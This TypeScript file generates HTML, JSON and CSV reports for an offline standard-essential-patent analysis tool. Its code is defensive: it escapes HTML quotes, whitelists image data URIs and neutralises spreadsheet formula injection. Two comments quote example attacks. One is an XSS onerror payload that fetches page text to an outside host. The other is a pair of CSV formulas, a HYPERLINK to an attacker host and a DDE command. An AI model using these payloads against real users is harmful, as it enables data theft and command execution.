/**
 * HTML Report Generator
 * Generates a downloadable HTML report from analysis results.
 * Preserves all original report functionality, removes Gemini branding.
 */

import type { AnalysisResponse, Declaration, ResearchOutputs, ResearchRecord } from '../types';
// Embedded as base64 (not a normal asset import) so the logo travels with the
// standalone downloaded report file — a normal import emits a hashed asset
// URL that no longer resolves once the report is saved/opened elsewhere.
import { CDOT_LOGO_DATA_URI } from '../assets/cdotLogoBase64';

/**
 * HTML-escape a value for interpolation into the generated report.
 *
 * Quotes MUST be escaped, not just angle brackets. esc() is interpolated into
 * double-quoted attribute values (e.g. the figure `alt=` below), and the
 * previous version left `"` intact — so a value containing
 *   `" onerror="fetch('http://x/?'+document.body.innerText)`
 * escaped the attribute and executed when the saved report was opened. The
 * values passed through here are LLM output derived from an uploaded PDF,
 * i.e. attacker-influenced for anyone who analyses a hostile declaration,
 * and the report is opened from file:// where script execution is not
 * sandboxed away from the rest of the user's disk.
 */
function esc(s: unknown): string {
  return String(s ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * Whitelist for image sources embedded in the report. Figures are produced by
 * the backend as base64 PNG/JPEG/SVG data URIs; anything else (a `javascript:`
 * URL, or a string crafted to break out of the src attribute) is dropped
 * rather than escaped, because there is no legitimate case for it.
 */
const SAFE_IMAGE_DATA_URI = /^data:image\/(png|jpeg|jpg|gif|webp|svg\+xml);base64,[A-Za-z0-9+/=\s]+$/;

function safeImageSrc(src: unknown): string | null {
  const v = String(src ?? '').trim();
  return SAFE_IMAGE_DATA_URI.test(v) ? v : null;
}

function confColor(score: number): string {
  return score >= 0.8 ? '#16a34a' : score >= 0.6 ? '#ca8a04' : '#dc2626';
}

function confLabel(score: number): string {
  return score >= 0.95 ? 'Explicit' : score >= 0.80 ? 'Strong' : score >= 0.60 ? 'Probable' : 'Speculative';
}

function confPill(score: number | null | undefined): string {
  if (score == null) return '';
  const color = confColor(score);
  return `<span style="display:inline-block;padding:1px 5px;border-radius:3px;background:${color}22;color:${color};font-family:monospace;font-size:9px;font-weight:700;border:1px solid ${color}44;margin-left:3px">${Math.round(score * 100)}%</span>`;
}

function simBar(score: number | null | undefined, label?: string): string {
  if (score == null) return '—';
  const pct = Math.round(score * 100);
  const color = score >= 0.6 ? '#16a34a' : score >= 0.5 ? '#0077cc' : score >= 0.35 ? '#ca8a04' : '#dc2626';
  const bar = `<div style="display:flex;align-items:center;gap:6px">
    <div style="flex:1;height:6px;background:#e2e8f0;border-radius:3px;overflow:hidden;min-width:60px">
      <div style="width:${pct}%;height:100%;background:${color};border-radius:3px"></div>
    </div>
    <span style="font-family:monospace;font-size:10px;color:${color};font-weight:700">${pct}%</span>
    ${label ? `<span style="font-family:monospace;font-size:9px;color:#94a3b8">${esc(label)}</span>` : ''}
  </div>`;
  return bar;
}

function statusBadge(status: string): string {
  const color = status === 'Confirmed SEP' ? '#16a34a' : status === 'Likely SEP' ? '#0077cc' : status === 'Potential SEP' ? '#ca8a04' : '#64748b';
  return `<span style="padding:2px 7px;border-radius:3px;font-family:monospace;font-size:10px;font-weight:700;background:${color}22;color:${color};border:1px solid ${color}44">${esc(status)}</span>`;
}

function specChip(s: string): string {
  return `<span style="display:inline-block;padding:1px 5px;border-radius:3px;background:#e8f0fe;color:#1a56db;font-size:10px;margin:1px;font-family:monospace">${esc(s)}</span>`;
}

function verBadge(status: string): string {
  const color = status.includes('forward') ? '#16a34a' : status === 'Predicted' ? '#0077cc' : status === 'Declining relevance' ? '#dc2626' : '#64748b';
  return `<span style="padding:2px 7px;border-radius:3px;font-family:monospace;font-size:10px;background:${color}22;color:${color};border:1px solid ${color}44">${esc(status)}</span>`;
}

function sectionHead(title: string): string {
  return `<div style="font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#64748b;margin:24px 0 10px;display:flex;align-items:center;gap:10px">${esc(title)}<div style="flex:1;height:1px;background:#e2e8f0"></div></div>`;
}

function th(s: string): string {
  return `<th style="padding:8px 10px;text-align:left;color:#64748b;font-size:9px;text-transform:uppercase;letter-spacing:1px;border-bottom:2px solid #e2e8f0;white-space:nowrap">${esc(s)}</th>`;
}
function td(content: string, extra = ''): string {
  return `<td style="padding:7px 10px;border-bottom:1px solid #e2e8f0;font-family:monospace;font-size:11px;vertical-align:top${extra ? ';' + extra : ''}">${content}</td>`;
}

function bars(items: [string, number][], max: number): string {
  const colors = ['#0077cc', '#6a3fcb', '#0a8a4a', '#b07000', '#cc1a35', '#8b5cf6'];
  return items.map(([label, val], i) => {
    const pct = Math.round((val / max) * 100);
    return `<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
      <div style="width:100px;text-align:right;font-family:monospace;font-size:10px;color:#64748b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(label)}</div>
      <div style="flex:1;height:16px;background:#f1f5f9;border-radius:3px;overflow:hidden">
        <div style="width:${pct}%;height:100%;background:${colors[i % colors.length]};border-radius:3px;display:flex;align-items:center;padding-left:6px">
          <span style="font-family:monospace;font-size:9px;color:#fff;font-weight:600">${val}</span>
        </div>
      </div>
    </div>`;
  }).join('');
}

// ── Research sections helpers ─────────────────────────────────────────────────

function researchSummaryStats(ro: ResearchOutputs): string {
  const { aggregates: ag, metrics: m } = ro;
  if (!ag) return '';
  const statCard = (label: string, value: string | number, color: string) =>
    `<div style="background:#fff;border:1px solid #e2e8f0;border-radius:8px;padding:12px">
      <div style="font-size:9px;text-transform:uppercase;letter-spacing:1px;color:#94a3b8">${esc(label)}</div>
      <div style="font-size:24px;font-weight:800;margin-top:4px;color:${color}">${value}</div>
    </div>`;

  const statsGrid = `<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px;margin-bottom:16px">
    ${statCard('Patents', ag.n_patents ?? 0, '#0077cc')}
    ${statCard('Avg. Similarity', `${Math.round((ag.average_similarity ?? 0) * 100)}%`, '#6a3fcb')}
    ${statCard('Avg. Confidence', `${Math.round((ag.average_confidence ?? 0) * 100)}%`, '#0a8a4a')}
    ${statCard('Potential SEPs', ag.n_potential_seps ?? 0, '#b07000')}
    ${m?.available ? statCard('Accuracy', `${Math.round((m.accuracy ?? 0) * 100)}%`, '#0a8a4a') : ''}
    ${m?.available ? statCard('F1 Score', `${Math.round((m.f1 ?? 0) * 100)}%`, '#0a8a4a') : ''}
    ${m?.available ? statCard("Cohen's κ", (m.cohens_kappa ?? 0).toFixed(2), '#6a3fcb') : ''}
  </div>`;

  const statusDist = ag.status_distribution ? Object.entries(ag.status_distribution).map(([s, n]) => `${n}× ${s}`).join(' &nbsp;|&nbsp; ') : '';

  return `${sectionHead('Research Summary Statistics')}${statsGrid}
    ${statusDist ? `<div style="font-family:monospace;font-size:11px;color:#475569;margin-bottom:16px">${statusDist}</div>` : ''}`;
}

function patentClassificationTable(ro: ResearchOutputs): string {
  const rows = ro.tables?.patent_classification ?? [];
  if (!rows.length) return '';
  return `${sectionHead('Patent Classification (Table I — cf. Paper 1, Table I)')}
  <div style="overflow-x:auto;margin-bottom:16px">
  <table style="width:100%;border-collapse:collapse;font-family:monospace;font-size:11px">
    <thead><tr>${[th('Application No.'), th('Probability'), th('Predicted SEP'), th('Recommended Standard'), th('Version'), th('Confidence')].join('')}</tr></thead>
    <tbody>
      ${rows.map((r, i) => `<tr style="${i % 2 === 1 ? 'background:#f9fafb' : ''}">
        ${td(esc(r.patent), 'color:#6a3fcb')}
        ${td(simBar(r.probability))}
        ${td(statusBadge(r.predicted_sep))}
        ${td(specChip(r.recommended_standard))}
        ${td(`<span style="color:#64748b">${esc(r.version)}</span>`)}
        ${td(simBar(r.confidence))}
      </tr>`).join('')}
    </tbody>
  </table></div>`;
}

function phrasesHtml(phrases?: string[], terms?: string[]): string {
  const p = (phrases ?? []).map(ph =>
    `<span style="display:inline-block;padding:1px 5px;margin:1px;border-radius:3px;background:#eef2ff;color:#1e293b;font-size:10px">&ldquo;${esc(ph)}&rdquo;</span>`
  ).join('');
  const t = terms?.length ? `<div style="color:#94a3b8;font-size:9px;margin-top:2px">Terms: ${esc(terms.join(', '))}</div>` : '';
  if (!p && !t) return `<span style="color:#94a3b8">${phrases ? 'None (semantic match)' : '&mdash;'}</span>`;
  return p + t;
}

function standardMappingTable(ro: ResearchOutputs): string {
  const rows = ro.tables?.standard_mapping ?? [];
  if (!rows.length) return '';
  return `${sectionHead('Standard Mapping (cf. Paper 2, I-Sim mapping result)')}
  <div style="overflow-x:auto;margin-bottom:16px">
  <table style="width:100%;border-collapse:collapse;font-family:monospace;font-size:11px">
    <thead><tr>${[th('Application No.'), th('Matched Standard'), th('Matched Clause'), th('Exact Phrases Matched'), th('Similarity'), th('Reason')].join('')}</tr></thead>
    <tbody>
      ${rows.map((r, i) => `<tr style="${i % 2 === 1 ? 'background:#f9fafb' : ''}">
        ${td(esc(r.patent), 'color:#6a3fcb')}
        ${td(specChip(r.matched_standard))}
        ${td(`<span style="color:#475569">${esc(r.matched_clause)}</span>${r.matched_clause_title ? `<br><span style="color:#94a3b8;font-size:10px">${esc(r.matched_clause_title)}</span>` : ''}`)}
        ${td(phrasesHtml(r.matched_phrases, r.matched_terms), 'max-width:260px')}
        ${td(simBar(r.similarity))}
        ${td(esc(r.reason), 'max-width:280px;color:#475569')}
      </tr>`).join('')}
    </tbody>
  </table></div>`;
}

function potentialSepTable(ro: ResearchOutputs): string {
  const rows = ro.tables?.potential_seps ?? [];
  if (!rows.length) return `${sectionHead('Potential SEPs')}
    <div style="font-family:monospace;font-size:11px;color:#94a3b8;margin-bottom:16px">No potential-SEP candidates found — all patents mapped to declared standards.</div>`;
  return `${sectionHead('Potential SEPs (cf. Paper 2, Table 8 — patents to validate)')}
  <div style="overflow-x:auto;margin-bottom:16px">
  <table style="width:100%;border-collapse:collapse;font-family:monospace;font-size:11px">
    <thead><tr>${[th('Application No.'), th('Topic'), th('Reason'), th('Missing Standard Section'), th('Predicted Future Version')].join('')}</tr></thead>
    <tbody>
      ${rows.map((r, i) => `<tr style="${i % 2 === 1 ? 'background:#fffbeb' : ''}">
        ${td(esc(r.patent), 'color:#6a3fcb')}
        ${td(`<span style="padding:1px 6px;border-radius:3px;background:#e0e7ff;color:#4338ca;font-size:10px">${esc(r.topic)}</span>`)}
        ${td(esc(r.reason), 'max-width:300px;color:#475569')}
        ${td(esc(r.missing_standard_section))}
        ${td(specChip(r.predicted_future_version))}
      </tr>`).join('')}
    </tbody>
  </table></div>`;
}

function verificationTable(ro: ResearchOutputs): string {
  const rows = ro.tables?.verification ?? [];
  if (!rows.length) return '';
  return `${sectionHead('Version Verification (cf. Paper 2, Table 7 — SEPs in updated standards)')}
  <div style="overflow-x:auto;margin-bottom:16px">
  <table style="width:100%;border-collapse:collapse;font-family:monospace;font-size:11px">
    <thead><tr>${[th('Application No.'), th('Current Version'), th('Future Version'), th('Verification'), th('Status')].join('')}</tr></thead>
    <tbody>
      ${rows.map((r, i) => `<tr style="${i % 2 === 1 ? 'background:#f9fafb' : ''}">
        ${td(esc(r.patent), 'color:#6a3fcb')}
        ${td(esc(r.current_version))}
        ${td(r.future_version ? esc(r.future_version) : '—')}
        ${td(esc(r.verification), 'max-width:280px;color:#475569')}
        ${td(verBadge(r.status))}
      </tr>`).join('')}
    </tbody>
  </table></div>`;
}

function figuresSection(ro: ResearchOutputs): string {
  if (!ro.figures) return '';
  const figs = Object.entries(ro.figures).filter(([, f]) => f?.image);
  if (!figs.length) return '';
  const ORDER = ['patent_similarity_scatter','standard_clustering','patent_topic_heatmap','similarity_matrix',
    'patent_standard_network','standards_timeline','version_evolution','confidence_distribution',
    'standard_frequency','version_distribution'];
  const sorted = [...ORDER.filter(k => ro.figures![k]?.image), ...figs.map(([k]) => k).filter(k => !ORDER.includes(k))];
  return `${sectionHead('Publication-Style Figures')}
  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px;margin-bottom:16px">
    ${sorted.map(k => {
      const fig = ro.figures![k];
      // `src` was interpolated raw. Validate it against the data-URI
      // whitelist and skip the figure entirely if it doesn't match, rather
      // than emitting an attacker-controlled attribute value.
      const src = safeImageSrc(fig?.image);
      if (!src) return '';
      return `<div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;overflow:hidden">
        <div style="font-family:monospace;font-size:9px;text-transform:uppercase;letter-spacing:1px;color:#94a3b8;padding:8px 10px">${esc(fig.title)}</div>
        <img src="${src}" style="width:100%;height:auto;display:block" alt="${esc(fig.title)}" />
        ${fig.caption ? `<div style="font-family:monospace;font-size:9px;color:#94a3b8;padding:6px 10px;border-top:1px solid #e2e8f0;line-height:1.5">${esc(fig.caption)}</div>` : ''}
      </div>`;
    }).join('')}
  </div>`;
}

function researchSection(ro: ResearchOutputs): string {
  return `<div style="margin-bottom:24px;border:1px solid #e2e8f0;border-radius:10px;overflow:hidden;padding:18px">
    <div style="font-size:15px;font-weight:700;margin-bottom:4px">Research-Style Analysis
      <span style="font-family:monospace;font-size:10px;font-weight:400;color:#94a3b8;margin-left:10px">${esc(ro.meta.embedder_mode)} · corpus ${ro.meta.corpus_size} refs · threshold ${Math.round(ro.meta.similarity_threshold * 100)}%</span>
    </div>
    <div style="font-family:monospace;font-size:10px;color:#94a3b8;margin-bottom:14px;line-height:1.5">${esc(ro.meta.disclaimer)}</div>
    ${researchSummaryStats(ro)}
    ${patentClassificationTable(ro)}
    ${standardMappingTable(ro)}
    ${potentialSepTable(ro)}
    ${verificationTable(ro)}
    ${figuresSection(ro)}
  </div>`;
}

/**
 * Open the printable HTML analysis report (every declaration, disclosure and research table) in a
 * new window. All values are HTML-escaped.
 */
export function generateReport(results: AnalysisResponse): void {
  const allDisclosures = results.declarations.flatMap(d => d.patent_disclosures ?? []);

  // Aggregate stats
  const specC: Record<string, number> = {};
  const countryC: Record<string, number> = {};
  const domainC: Record<string, number> = {};

  allDisclosures.forEach(p => {
    (p.explicit_data?.standards ?? []).forEach(s => { specC[s] = (specC[s] ?? 0) + 1; });
    const c = p.explicit_data?.country || 'Unknown';
    countryC[c] = (countryC[c] ?? 0) + 1;
    (p.standards_analysis?.technical_domains ?? []).forEach(d => {
      if (d.domain) domainC[d.domain] = (domainC[d.domain] ?? 0) + 1;
    });
  });

  type Pair = [string, number];
  const topN = (obj: Record<string, number>, n: number): Pair[] =>
    Object.entries(obj).sort((a, b) => b[1] - a[1]).slice(0, n) as Pair[];

  const tS = topN(specC, 8), tC = topN(countryC, 8), tD = topN(domainC, 8);
  const mS = tS[0]?.[1] || 1, mC = tC[0]?.[1] || 1, mD = tD[0]?.[1] || 1;

  const model = results.declarations[0]?._model || 'Local LLM';
  const backend = 'CDOT'; // display label — was showing the raw inference engine name (e.g. "ollama")

  const sectionsHtml = results.declarations.map((decl: Declaration) => {
    const meta = decl.declaration_metadata ?? {};
    const port = decl.portfolio_level_analysis ?? {};
    const disclosures = decl.patent_disclosures ?? [];

    const rowsHtml = disclosures.map((p, i) => {
      const ed = p.explicit_data ?? {};
      const sa = p.standards_analysis ?? {};
      const sep = p.sep_analysis ?? {};
      const inf = p.inferred_fields ?? {};
      const rr = decl.research_outputs?.records?.[i];

      const standards = (ed.standards ?? []).map(s =>
        `<span style="display:inline-block;padding:1px 5px;border-radius:3px;background:#e8f0fe;color:#1a56db;font-size:10px;margin:1px;font-family:monospace">${esc(s)}</span>`
      ).join('') || '&mdash;';

      const domains = (sa.technical_domains ?? []).map(d =>
        `${esc(d.domain)}${confPill(d.confidence)}`
      ).join(' ') || '&mdash;';

      const releases = (sa['3gpp_release_mapping'] ?? []).map(r =>
        `<span style="display:inline-block;padding:1px 6px;background:#dbeafe;color:#1e40af;border-radius:3px;font-family:monospace;font-size:10px;margin:1px">${esc(r.release)}${confPill(r.confidence)}</span>`
      ).join('') || '&mdash;';

      const sepStr = sep.likely_sep_strength || '';
      const sepColor = sepStr.toLowerCase().includes('high') ? '#166534'
                     : sepStr.toLowerCase().includes('low') ? '#991b1b' : '#854d0e';
      const sepBg = sepStr.toLowerCase().includes('high') ? '#dcfce7'
                  : sepStr.toLowerCase().includes('low') ? '#fee2e2' : '#fef9c3';
      const sepHtml = sepStr
        ? `<span style="padding:2px 7px;border-radius:3px;font-family:monospace;font-size:10px;font-weight:700;background:${sepBg};color:${sepColor}">${esc(sepStr)}</span>${confPill(sep.confidence)}`
        : '&mdash;';

      const predictedHtml = rr ? statusBadge(rr.predicted_sep_status) : '&mdash;';
      const stdVersionHtml = rr
        ? `${specChip(rr.recommended_standard)}<span style="font-family:monospace;font-size:9px;color:#64748b;margin-left:4px">${esc(rr.recommended_version)}</span><br><span style="font-family:monospace;font-size:9px;color:#6a3fcb">${esc(rr.standard_clause)}</span>`
        : '&mdash;';

      return `<tr style="border-bottom:1px solid #e2e8f0;${i % 2 === 1 ? 'background:#f9fafb' : ''}">
        ${td(String(p.disclosure_number ?? i + 1), 'color:#94a3b8')}
        ${td(standards)}
        ${td(esc(ed.application_number), 'color:#6a3fcb')}
        ${td(esc(ed.publication_number), 'color:#6a3fcb')}
        ${td(esc(ed.country))}
        ${td(sepHtml)}
        ${td(predictedHtml)}
        ${td(stdVersionHtml)}
        ${td(esc(ed.title || inf.probable_title), 'max-width:180px')}
        ${td(domains)}
        ${td(releases)}
      </tr>`;
    }).join('');

    return `
      <div style="margin-bottom:32px;border:1px solid #e2e8f0;border-radius:10px;overflow:hidden">
        <div style="background:#f8fafc;padding:14px 18px;border-bottom:1px solid #e2e8f0">
          <div style="font-size:16px;font-weight:700;color:#1a1e2e">${esc(meta.declarant || decl.filename)}</div>
          <div style="font-family:monospace;font-size:11px;color:#64748b;margin-top:4px">
            ${esc(meta.likely_standard_generation || '')} · ${esc(meta.filing_type || '')} · ${disclosures.length} patents${confPill(meta.confidence)}
          </div>
          ${meta.portfolio_characterization ? `<div style="font-family:monospace;font-size:11px;color:#475569;margin-top:6px">${esc(meta.portfolio_characterization)}</div>` : ''}
          ${port.frand_implications ? `<div style="margin-top:8px;padding:8px 12px;background:#fffbeb;border:1px solid #fde68a;border-radius:6px;font-family:monospace;font-size:11px;color:#92400e"><strong>FRAND:</strong> ${esc(port.frand_implications)}</div>` : ''}
        </div>
        <div style="overflow-x:auto">
          <table style="width:100%;border-collapse:collapse;font-family:monospace;font-size:12px">
            <thead>
              <tr style="border-bottom:2px solid #e2e8f0">
                ${th('#')}${th('Standards')}${th('App No.')}${th('Patent No. (Publication)')}${th('Country')}${th('SEP Strength')}${th('Predicted SEP')}${th('Standard + Version')}${th('Title')}${th('Domains')}${th('Releases')}
              </tr>
            </thead>
            <tbody>${rowsHtml}</tbody>
          </table>
        </div>
        ${decl.research_outputs ? researchSection(decl.research_outputs) : ''}
      </div>`;
  }).join('');

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>CPARAS ISLD — SEP Analysis Report — ${new Date().toLocaleDateString()}</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#f8fafc;color:#1a1e2e;padding:32px}
.container{max-width:1400px;margin:0 auto}
h1{font-size:28px;font-weight:800;color:#1a1e2e;margin-bottom:4px}
.sub{font-family:monospace;font-size:12px;color:#64748b;margin-bottom:24px}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:24px}
.stat{background:#fff;border:1px solid #e2e8f0;border-radius:10px;padding:16px}
.stat-label{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#94a3b8}
.stat-value{font-size:32px;font-weight:800;margin-top:4px}
.stat-sub{font-size:10px;color:#94a3b8;margin-top:2px;font-family:monospace}
.charts{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px}
.chart{background:#fff;border:1px solid #e2e8f0;border-radius:10px;padding:16px}
.chart-title{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:#64748b;margin-bottom:12px}
.footer{text-align:center;padding:24px;font-family:monospace;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;margin-top:32px}
.badge{display:inline-block;padding:2px 8px;border-radius:4px;background:#dcfce7;color:#166534;font-size:10px;font-weight:700;font-family:monospace}
</style>
</head>
<body>
<div class="container">
  <h1 style="display:flex;align-items:center;gap:14px">
    <img src="${CDOT_LOGO_DATA_URI}" alt="C-DOT" style="height:48px;width:auto;border-radius:6px;background:#fff;padding:3px" />
    CPARAS ISLD — SEP Analysis Report
  </h1>
  <div class="sub">Generated ${new Date().toLocaleString()} · <span class="badge">OFFLINE</span> ${esc(backend)} · ${esc(model)}</div>
  <div class="stats">
    <div class="stat"><div class="stat-label">Total Patents</div><div class="stat-value" style="color:#0077cc">${allDisclosures.length}</div><div class="stat-sub">disclosed SEPs</div></div>
    <div class="stat"><div class="stat-label">Declarations</div><div class="stat-value" style="color:#6a3fcb">${results.declarations.length}</div><div class="stat-sub">IPR filings</div></div>
    <div class="stat"><div class="stat-label">Specifications</div><div class="stat-value" style="color:#0a8a4a">${Object.keys(specC).length}</div><div class="stat-sub">3GPP TSs</div></div>
    <div class="stat"><div class="stat-label">Jurisdictions</div><div class="stat-value" style="color:#b07000">${Object.keys(countryC).length}</div><div class="stat-sub">filing countries</div></div>
  </div>
  <div class="charts">
    ${tS.length ? `<div class="chart"><div class="chart-title">Top 3GPP Specifications</div>${bars(tS, mS)}</div>` : ''}
    ${tC.length ? `<div class="chart"><div class="chart-title">Jurisdictions</div>${bars(tC, mC)}</div>` : ''}
    ${tD.length ? `<div class="chart"><div class="chart-title">Technical Domains</div>${bars(tD, mD)}</div>` : ''}
  </div>
  <h2 style="font-size:18px;font-weight:700;margin-bottom:16px">Declaration Details</h2>
  ${sectionsHtml}
  <div class="footer">CPARAS ISLD — C-DOT SEP Intelligence Platform · Fully Offline · ${esc(backend)} backend · No cloud APIs</div>
</div>
</body>
</html>`;

  const blob = new Blob([html], { type: 'text/html' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `CDOT_ESSENTIALITY_ANALYSIS_REPORT_${new Date().toISOString().slice(0, 10)}.html`;
  document.body.appendChild(a);
  a.click();
  setTimeout(() => { URL.revokeObjectURL(url); document.body.removeChild(a); }, 1000);
}

/** Download the full analysis result as JSON. */
export function exportJSON(results: AnalysisResponse): void {
  const blob = new Blob([JSON.stringify(results, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `cparas_isld_analysis_${new Date().toISOString().slice(0, 10)}.json`;
  document.body.appendChild(a);
  a.click();
  setTimeout(() => { URL.revokeObjectURL(url); document.body.removeChild(a); }, 1000);
}

/** Essential / Potential / Non-Essential from the backend status vocabulary
 *  (mirrors research.three_signal_scoring.essentiality_from_status). */
function essentialityLabel(status?: string | null): string {
  switch ((status ?? '').trim().toLowerCase()) {
    case 'confirmed sep':
    case 'likely sep':
      return 'Essential';
    case 'potential sep':
      return 'Potential';
    case 'insufficient evidence':
      return 'Non-Essential';
    default:
      return '';
  }
}

/**
 * Download one CSV row per disclosure (formula-injection safe), including essentiality, recommended
 * standard/version/clause and exact matched phrases.
 */
export function exportCSV(results: AnalysisResponse): void {
  const headers = [
    'Declaration', 'App Number', 'Patent Number (Publication)', 'Country', 'Declared Standards',
    'SEP Strength', 'SEP Confidence',
    'Predicted SEP Status', 'Essentiality', 'Overall Confidence',
    'Recommended Standard', 'Recommended Version', 'Standard Clause', 'Exact Phrases Matched', 'Shared Terms',
    'Standard Similarity', 'Similar Patent',
    'Primary Domain', 'Verification Status', 'Is Potential SEP',
    'Title',
  ];
  const rows = results.declarations.flatMap(decl =>
    (decl.patent_disclosures ?? []).map((p, i) => {
      const rr = decl.research_outputs?.records?.[i];
      return [
        decl.declaration_metadata?.declarant ?? decl.filename,
        p.explicit_data?.application_number ?? '',
        p.explicit_data?.publication_number ?? '',
        p.explicit_data?.country ?? '',
        (p.explicit_data?.standards ?? []).join('; '),
        p.sep_analysis?.likely_sep_strength ?? '',
        p.sep_analysis?.confidence ?? '',
        rr?.predicted_sep_status ?? '',
        essentialityLabel(rr?.predicted_sep_status),
        rr?.confidence_score ?? '',
        rr?.recommended_standard ?? '',
        rr?.recommended_version ?? '',
        rr?.standard_clause ?? '',
        (rr?.matched_phrases ?? []).join('; '),
        (rr?.matched_terms ?? []).join('; '),
        rr?.similarity_score ?? '',
        rr?.similar_patent ?? '',
        p.standards_analysis?.technical_domains?.[0]?.domain ?? '',
        rr?.verification?.status ?? '',
        rr?.is_potential_sep ? 'Yes' : 'No',
        p.explicit_data?.title ?? p.inferred_fields?.probable_title ?? '',
      ];
    })
  );

  // Neutralise spreadsheet formula injection (CWE-1236). Cell values here are
  // LLM output derived from an uploaded PDF, so a declaration containing
  // `=HYPERLINK("http://attacker/"&A1,"Open")` — or the DDE variant
  // `=cmd|'/c calc'!A1` — would execute on open in Excel/LibreOffice, not in
  // the browser. Correct CSV quoting (already present) does not prevent this;
  // the leading character must be defanged. Prefixing with an apostrophe is
  // the standard mitigation and renders as a plain string.
  const RISKY_LEAD = /^[=+\-@\t\r]/;
  const csvCell = (cell: unknown): string => {
    let v = String(cell ?? '');
    if (RISKY_LEAD.test(v)) v = `'${v}`;
    return `"${v.replace(/"/g, '""')}"`;
  };

  const csv = [headers, ...rows].map(row => row.map(csvCell).join(',')).join('\r\n');

  const blob = new Blob([csv], { type: 'text/csv' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `cparas_isld_analysis_${new Date().toISOString().slice(0, 10)}.csv`;
  document.body.appendChild(a);
  a.click();
  setTimeout(() => { URL.revokeObjectURL(url); document.body.removeChild(a); }, 1000);
}
